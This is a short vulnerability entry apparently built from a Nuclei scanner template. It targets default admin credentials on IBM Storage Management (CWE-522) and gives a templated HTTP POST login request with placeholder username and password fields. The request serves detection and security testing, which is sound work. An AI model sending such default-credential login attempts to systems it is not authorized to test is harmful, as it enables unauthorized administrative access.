# Vulnerability: IBM Storage Management Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`ibm-storage-default-credential.yaml`)

## Description
IBM Storage Management default admin login credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /0/Authenticate HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded

j_username={{username}}&j_password={{password}}&continue=&submit=submit+form
```

